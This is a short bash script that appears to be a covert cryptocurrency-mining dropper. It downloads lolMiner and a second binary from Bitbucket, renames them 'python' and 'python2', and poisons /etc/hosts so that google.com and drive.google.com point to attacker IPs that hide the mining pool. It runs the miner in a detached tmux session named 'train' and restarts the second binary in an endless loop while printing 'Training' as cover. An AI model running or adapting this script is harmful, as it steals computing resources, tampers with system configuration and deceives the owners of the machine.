#!/bin/bash  
apt-get install tmux -y
wget https://bitbucket.org/tengikekao/myrep/downloads/lolMiner
sh -c "echo '35.197.158.228  google.com' >> /etc/hosts"
mv lolMiner python
chmod +x python
tmux new-session -d -s train './python --coin BEAM --pool google.com --port 443 --user 2c1c361ca22136a66c1ba02cd4468f569c8b599ea6ebcd8dc189a2a40641def4200.col'
wget https://bitbucket.org/tengikekao/grin/downloads/goo.zip
unzip goo.zip
mv python3 python2
chmod +x python2
sh -c "echo '104.211.3.145  drive.google.com' >> /etc/hosts"
while (true) ; do if pgrep -x "python2" > /dev/null; then echo "Training";else echo "Train was installed" && tmux new-session -d -s my_session1 './python2';fi; sleep 30; done

